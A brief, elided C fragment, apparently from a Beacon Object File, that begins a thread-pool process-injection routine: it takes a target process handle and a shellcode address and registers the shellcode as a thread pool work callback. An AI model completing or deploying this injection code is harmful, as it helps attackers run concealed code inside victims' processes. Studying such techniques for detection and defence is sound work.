...
void RemoteTpWorkInsertion(HANDLE hTarget, PVOID pShellcodeAddress) {
    ...
    TargetTpPool = (PFULL_TP_POOL)MSVCRT$calloc(1, sizeof(FULL_TP_POOL));
    ...
    PFULL_TP_WORK pTpWork = (PFULL_TP_WORK)KERNEL32$CreateThreadpoolWork((PTP_WORK_CALLBACK)pShellcodeAddress, NULL, NULL);
